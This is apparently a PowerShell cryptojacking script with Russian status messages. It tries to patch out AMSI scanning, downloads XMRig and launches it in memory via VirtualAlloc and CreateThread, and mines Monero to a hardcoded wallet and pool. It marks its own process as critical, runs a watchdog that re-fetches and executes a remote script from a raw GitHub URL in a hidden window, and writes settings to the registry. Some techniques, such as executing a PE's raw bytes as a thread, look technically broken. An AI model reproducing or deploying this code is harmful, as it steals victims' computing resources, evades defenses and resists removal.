try {
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $f = $a.GetField('amsiSession','NonPublic,Static')
    if($f) {[Runtime.InteropServices.Marshal]::Copy([Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,$f.GetValue($null),6)}
} catch {}

$base = "$env:COMPUTERNAME-$env:USERNAME-$(Get-CimInstance Win32_ComputerSystemProduct -ErrorAction SilentlyContinue | Select -Expand UUID)"
$worker = "KAGE-" + [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($base)).Substring(0,16) -replace '[+/=]','X'

$wallet = "878rfYEi5WT32JwKXPmNSAi2S91WchiZnTsQbUPV9tUCR3ADEGTrTkZTu4exF6GiP6gqHFz4zZi5DE8V5jy2RYnLJvVwde6"
$pool   = "gulf.moneroocean.stream:10128"
$args   = "-o $pool -u $wallet -p $worker --tls --cpu-max-threads-hint=95 --randomx-1gb-pages --donate-level=1 -k --no-color"

Write-Host "[+] Скачиваем XMRig..." -ForegroundColor Yellow
$xmrigUrl = "https://github.com/MoneroOcean/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip"
$zip = (New-Object Net.WebClient).DownloadData($xmrigUrl)

Add-Type -AssemblyName System.IO.Compression.FileSystem
$stream = New-Object IO.MemoryStream(,$zip)
$archive = New-Object IO.Compression.ZipArchive($stream)
$entry = $archive.GetEntry("xmrig.exe")
$exeStream = $entry.Open()
$bytes = New-Object byte[] $entry.Length
$exeStream.Read($bytes,0,$bytes.Length) | Out-Null
$exeStream.Close(); $stream.Close(); $archive.Dispose()

Write-Host "[+] XMRig в памяти. Запускаем через VirtualAlloc + CreateThread (без PowerSploit)" -ForegroundColor Green

$code = @"
using System;
using System.Runtime.InteropServices;
public class RunPE {
    [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, ref uint i);
    [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint t);
    public static void Go(byte[] b) {
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)b.Length, 0x3000, 0x40);
        Marshal.Copy(b, 0, addr, b.Length);
        uint id = 0;
        IntPtr h = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, ref id);
        WaitForSingleObject(h, 0xFFFFFFFF);
    }
}
"@
Add-Type $code
[RunPE]::Go($bytes)

Write-Host "[+] Майнер запущен в памяти! Worker: $worker" -ForegroundColor Cyan
Write-Host "[+] Логи XMRig:" -ForegroundColor Magenta

$imm = @"
using System;using System.Runtime.InteropServices;
public class Imm {
    [DllImport("ntdll.dll")] static extern uint RtlAdjustPrivilege(int,bool,bool,out bool);
    [DllImport("ntdll.dll")] static extern uint NtSetInformationProcess(IntPtr,int,ref int,int);
    public static void Run(){bool b;RtlAdjustPrivilege(20,true,false,out b);int v=-1;NtSetInformationProcess((IntPtr)(-1),29,ref v,4);}
}
"@
Add-Type $imm -ErrorAction SilentlyContinue
[Imm]::Run()

$wd = {while($true){Start-Sleep 300;if(!(Get-Process powershell -ea 0|?{$_.MainWindowTitle -like "*KAGE*"})){powershell -nop -win hidden -c "IEX((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fokisfisi-rgb/sisi/refs/heads/main/miner.ps1'))"}}}
Start-Job -ScriptBlock $wd | Out-Null

reg add "HKCU\Software\XMRig" /v "args" /d "$args" /f >$null 2>&1